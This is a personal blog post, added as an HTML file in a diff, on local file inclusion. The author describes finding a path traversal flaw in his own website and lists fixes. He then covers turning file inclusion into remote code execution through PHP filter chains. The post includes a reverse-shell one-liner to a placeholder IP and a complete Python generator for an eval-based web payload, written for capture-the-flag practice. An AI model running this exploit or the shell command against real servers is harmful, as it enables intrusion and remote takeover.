@@ -1,0 +1,201 @@
+<!DOCTYPE HTML>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Projects</title>
+    <link rel="stylesheet" href="/bootstrap.min.css"/>
+    <link rel="stylesheet" href="/default.css"/>
+    <link rel="icon" type="image/png" href="/siteicon.png">
+</head>
+<body>
+
+<div class="container">
+    <div class="row mt-3">
+        <a href="/"><img  alt="" src="/siteicon.png" width="50"></a>
+    </div>
+    <div class="row">
+        <div class="col-md-8 mx-auto">
+            <h1 class="mt-5 mb-1">How I hacked my own website</h1>
+            <div class="mb-4 text-secondary border-bottom">Local file inclusion vulnerability and local file inclusion to remote code execution</div>
+            <div><style type="text/css">
+td {
+    padding:0 15px;
+}
+
+.force-word-wrap pre code {
+  white-space : pre-wrap !important;
+}
+</style>
+<p style="text-align:center;">
+    <img src="/developerpropeller.jpg" width="300" class="center">
+</p>
+<h2 class="border-bottom mb-3 mt-5">Content in this Blog Post</h2>
+<p>In this blog post I will discuss the following points</p>
+<ol>
+<li>Local file inclusion, how I hacked my own website</li>
+<li>An insane local file inclusion to remote code execution vulnerability</li>
+</ol>
+<p>Recently, I have been learning about penetration testing (hacking), and the most enjoyable aspect of this process is doing Capture The Flags (CTFs). This involves breaking into a vulnerable machine and escalating privileges to take ownership of the machine. In a recent CTF challenge, I learned about local file inclusion, and at some point, I realized that my own website was also susceptible to it. Big oops.</p>
+<h2 class="border-bottom mb-3 mt-5">What is LFI and how I hacked myself</h2>
+<p>So what is local file inclusion (LFI)? LFI is where files on the server that are not meant to be viewed are exposed to a visitor of the web page. These files can contain very sensitive information such as usernames and passwords, ssh keys, or other sensitive information that you don’t want leaked out.</p>
+<p>When does LFI happen? LFI happens when user input from a url is used to retrieve a file on the server that will be displayed.</p>
+<p>Consider the following example: Let’s say we have the following URL, <a href="https://vulnerablewebsite.com/showpage.php?page=article1">https://vulnerablewebsite.com/showpage.php?page=article1</a>, which is designed to display “article1” on the screen. In this context, local file inclusion (LFI) occurs if:</p>
+<ul>
+<li><code>showpage.php</code> uses the value of the page parameter to read a file from the file system to be displayed</li>
+<li>The value of the page parameter is not validate or sanitized</li>
+</ul>
+<p>An attacker could manipulate the “page” parameter to include local files. For instance, an attacker might try accessing sensitive files with a payload like <code>https://vulnerablewebsite.com/showpage.php?page=/path/to/database/configuration/that/contains/a/password</code> (this was the crux of the CTF I was doing). I read that mostly php sites are vulnerable to this kind of attack, but that its not exclusive to php, and then it dawned on me. Although I use Nodejs for this website I do exactly the same thing. I grab a value from the url look up a markdown file corresponding to that value on the file system, I transform the markdown file into an html page an serve it to the user.</p>
+<p>So I tried manipulating my own URL as follows: <code>http://niekdeschipper.com/projects/../../../../../../etc/passwd</code>. The <code>../../../../</code> part traverses back to the root of the file system, and <code>/etc/passwd</code> is the path to a fairly common file that almost always exists. It shows which users are present on the server, and at some point in history, it contained passwords. This did not work, but after applying url encoding, I got the following:</p>
+<p style="text-align:center;">
+    <img src="/hacked.png" width="800" class="center">
+</p>
+<p>Oh no! This was a very funny moment. I never realized this would be a possibility when I designed my own janky web server. I knew the phrase “never trust user input,” but did not realize that the URL is also user input. In my case, it wasn’t that bad. Although visitors to my site had access to the whole file system all this time, there was no sensitive information on the server because I run the web server in a container on Kubernetes. If I ran it on a virtual machine, or, God forbid, my own personal machine, it would have been a completely different story. Everyone would have had access to all kinds of access keys.</p>
+<p>So, what lessons can you learn from this?</p>
+<ul>
+<li>Don’t use unsanitized input from the URL to retrieve and display files from the file system. You could sanitize the input by making path traversal impossible, or even better, only allow whitelisted user input.</li>
+<li>Prevent needing user input altogether. Why did I even use the URL path to retrieve files anyway? The answer: because I was lazy. Now, I generate my HTML files beforehand (not upon request), like other static site generators.</li>
+<li>Don’t create your own static website generator. Although I am happy with it, if I would have known better, I would have picked an existing technology.</li>
+</ul>
+<h2 class="border-bottom mb-3 mt-5">Local file inclusion to remote code execution</h2>
+<p>Another CTF had me exploit LFI to Remote code execution, which seemed insane to me at first. How would you get remote code execution from only local file inclusion?
+Well, in comes the php wrapper filter module. If this module is enabled and if LFI is possible on the server by means of the <code>include()</code> function, you are in!</p>
+<p>You can abuse the php filter module to add characters before the file to be included in an <code>include()</code> function. Everything that ends up in the <code>include()</code> statement gets executed on the server, so you can add code before the file, that retrieves a reverse shell from the url (for example: <code>exec('bash -i &gt; /dev/tcp/10.10.10.10/4444 0&gt;&amp;1');</code>).</p>
+<p>I crafted the following URL exploit generator from various sources on the internet (the ones I found did not end up working for me), it has been very useful for CTFs thus far (I don’t expect it to be very relevant these days anymore in reality). But if you encounter a php web server vulnerable to LFI, chances are the might be also vulnerable to this. Below you can find the script, it is meant to be quite readable:</p>
+<pre><code class="language-python"><span class="hljs-comment"># Local file inclusion (LFI) to RCE (Remote code execution) Exploit</span>
+<span class="hljs-comment">#</span>
+<span class="hljs-comment"># This script generates a url containing a command to be executed on the target</span>
+<span class="hljs-comment"># The script works if LFI is possible on a server running php, in combination with the php filter wrapper</span>
+<span class="hljs-comment">#</span>
+<span class="hljs-comment"># It is based on a bunch of similar scripts, that did not do the trick for me,</span>
+<span class="hljs-comment"># so I created a new one. It has been very helpful in more CTF&#x27;s than I anticipated.</span>
+<span class="hljs-comment">#</span>
+<span class="hljs-comment"># For information see:</span>
+<span class="hljs-comment"># See: https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters</span>
+<span class="hljs-comment">#</span>
+<span class="hljs-comment"># Usage:</span>
+<span class="hljs-comment"># Set the variables</span>
+<span class="hljs-comment"># python3 ./exploit.py</span>
+
+
+<span class="hljs-comment">################################################################################################3</span>
+<span class="hljs-comment"># CHANGE ME</span>
+
+url = <span class="hljs-string">&quot;http://target-ip/script.php?page=&quot;</span>  <span class="hljs-comment"># url to the vulnerable path</span>
+file_to_use = <span class="hljs-string">&quot;../../../../../etc/passwd/&quot;</span> <span class="hljs-comment"># a file vulnerable to LFI</span>
+command = <span class="hljs-string">&quot;phpinfo();&quot;</span> <span class="hljs-comment"># This command gets executed on the target, use your own command here and url encode it</span>
+
+
+<span class="hljs-comment">################################################################################################3</span>
+<span class="hljs-keyword">import</span> base64
+
+<span class="hljs-comment"># The code in the variable &quot;payload&quot; is the code that executes the command on the target</span>
+<span class="hljs-comment"># The payload gets inserted using the php filter before included file</span>
+<span class="hljs-comment"># and gets included together with the &quot;file_to_use&quot;.</span>
+<span class="hljs-comment"># The payload works by reading the command from the from url and passing it to eval.</span>
+<span class="hljs-comment"># You could also directly put the command in the payload, but that will result in an extermely long</span>
+<span class="hljs-comment"># url that will most likely be rejected by the server.</span>
+
+payload = <span class="hljs-string">&quot;&lt;?= $a =$_GET[&#x27;0&#x27;];eval($a);?&gt;&quot;</span>
+payload = payload.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)
+base64_payload = base64.b64encode(payload).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>).replace(<span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)
+
+conversions = {
+    <span class="hljs-string">&#x27;0&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2&#x27;</span>,
+    <span class="hljs-string">&#x27;1&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4&#x27;</span>,
+    <span class="hljs-string">&#x27;2&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921&#x27;</span>,
+    <span class="hljs-string">&#x27;3&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE&#x27;</span>,
+    <span class="hljs-string">&#x27;4&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE&#x27;</span>,
+    <span class="hljs-string">&#x27;5&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2&#x27;</span>,
+    <span class="hljs-string">&#x27;6&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2&#x27;</span>,
+    <span class="hljs-string">&#x27;7&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4&#x27;</span>,
+    <span class="hljs-string">&#x27;8&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,
+    <span class="hljs-string">&#x27;9&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB&#x27;</span>,
+    <span class="hljs-string">&#x27;A&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213&#x27;</span>,
+    <span class="hljs-string">&#x27;a&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE&#x27;</span>,
+    <span class="hljs-string">&#x27;B&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000&#x27;</span>,
+    <span class="hljs-string">&#x27;b&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE&#x27;</span>,
+    <span class="hljs-string">&#x27;C&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,
+    <span class="hljs-string">&#x27;c&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2&#x27;</span>,
+    <span class="hljs-string">&#x27;D&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213&#x27;</span>,
+    <span class="hljs-string">&#x27;d&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5&#x27;</span>,
+    <span class="hljs-string">&#x27;E&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT&#x27;</span>,
+    <span class="hljs-string">&#x27;e&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937&#x27;</span>,
+    <span class="hljs-string">&#x27;F&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB&#x27;</span>,
+    <span class="hljs-string">&#x27;f&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213&#x27;</span>,
+    <span class="hljs-string">&#x27;g&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8&#x27;</span>,
+    <span class="hljs-string">&#x27;G&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90&#x27;</span>,
+    <span class="hljs-string">&#x27;H&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213&#x27;</span>,
+    <span class="hljs-string">&#x27;h&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE&#x27;</span>,
+    <span class="hljs-string">&#x27;I&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213&#x27;</span>,
+    <span class="hljs-string">&#x27;i&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000&#x27;</span>,
+    <span class="hljs-string">&#x27;J&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4&#x27;</span>,
+    <span class="hljs-string">&#x27;j&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16&#x27;</span>,
+    <span class="hljs-string">&#x27;K&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE&#x27;</span>,
+    <span class="hljs-string">&#x27;k&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2&#x27;</span>,
+    <span class="hljs-string">&#x27;L&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC&#x27;</span>,
+    <span class="hljs-string">&#x27;l&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE&#x27;</span>,
+    <span class="hljs-string">&#x27;M&#x27;</span>:<span class="hljs-string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T&#x27;</span>,
+    <span class="hljs-string">&#x27;m&#x27;</span>:<span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949&#x27;</span>,
+    <span class="hljs-string">&#x27;N&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4&#x27;</span>,
+    <span class="hljs-string">&#x27;n&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61&#x27;</span>,
+    <span class="hljs-string">&#x27;O&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775&#x27;</span>,
+    <span class="hljs-string">&#x27;o&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE&#x27;</span>,
+    <span class="hljs-string">&#x27;P&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB&#x27;</span>,
+    <span class="hljs-string">&#x27;p&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4&#x27;</span>,
+    <span class="hljs-string">&#x27;q&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2&#x27;</span>,
+    <span class="hljs-string">&#x27;Q&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2&#x27;</span>,
+    <span class="hljs-string">&#x27;R&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4&#x27;</span>,
+    <span class="hljs-string">&#x27;r&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101&#x27;</span>,
+    <span class="hljs-string">&#x27;S&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS&#x27;</span>,
+    <span class="hljs-string">&#x27;s&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90&#x27;</span>,
+    <span class="hljs-string">&#x27;T&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103&#x27;</span>,
+    <span class="hljs-string">&#x27;t&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS&#x27;</span>,
+    <span class="hljs-string">&#x27;U&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943&#x27;</span>,
+    <span class="hljs-string">&#x27;u&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61&#x27;</span>,
+    <span class="hljs-string">&#x27;V&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB&#x27;</span>,
+    <span class="hljs-string">&#x27;v&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2&#x27;</span>,
+    <span class="hljs-string">&#x27;W&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936&#x27;</span>,
+    <span class="hljs-string">&#x27;w&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE&#x27;</span>,
+    <span class="hljs-string">&#x27;X&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932&#x27;</span>,
+    <span class="hljs-string">&#x27;x&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS&#x27;</span>,
+    <span class="hljs-string">&#x27;Y&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361&#x27;</span>,
+    <span class="hljs-string">&#x27;y&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT&#x27;</span>,
+    <span class="hljs-string">&#x27;Z&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16&#x27;</span>,
+    <span class="hljs-string">&#x27;z&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937&#x27;</span>,
+    <span class="hljs-string">&#x27;/&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4&#x27;</span>,
+    <span class="hljs-string">&#x27;+&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157&#x27;</span>,
+    <span class="hljs-string">&#x27;=&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>
+}
+
+<span class="hljs-comment"># generate some garbage base64</span>
+filters = <span class="hljs-string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span>
+filters += <span class="hljs-string">&quot;convert.base64-encode|&quot;</span>
+<span class="hljs-comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span>
+filters += <span class="hljs-string">&quot;convert.iconv.UTF8.UTF7|&quot;</span>
+
+
+<span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> base64_payload[::-<span class="hljs-number">1</span>]:
+        filters += conversions[c] + <span class="hljs-string">&quot;|&quot;</span>
+        <span class="hljs-comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span>
+        filters += <span class="hljs-string">&quot;convert.base64-decode|&quot;</span>
+        filters += <span class="hljs-string">&quot;convert.base64-encode|&quot;</span>
+        <span class="hljs-comment"># get rid of equal signs</span>
+        filters += <span class="hljs-string">&quot;convert.iconv.UTF8.UTF7|&quot;</span>
+
+filters += <span class="hljs-string">&quot;convert.base64-decode&quot;</span>
+
+final_payload = <span class="hljs-string">f&quot;php://filter/<span class="hljs-subst">{filters}</span>/resource=<span class="hljs-subst">{file_to_use}</span>&quot;</span>
+
+<span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">{url}</span><span class="hljs-subst">{final_payload}</span>&amp;0=<span class="hljs-subst">{command}</span>&quot;</span>)
+</code></pre>
+</div>
+        </div>
+    </div>
+</div>
+
+
+</body>
+</html>
+
+
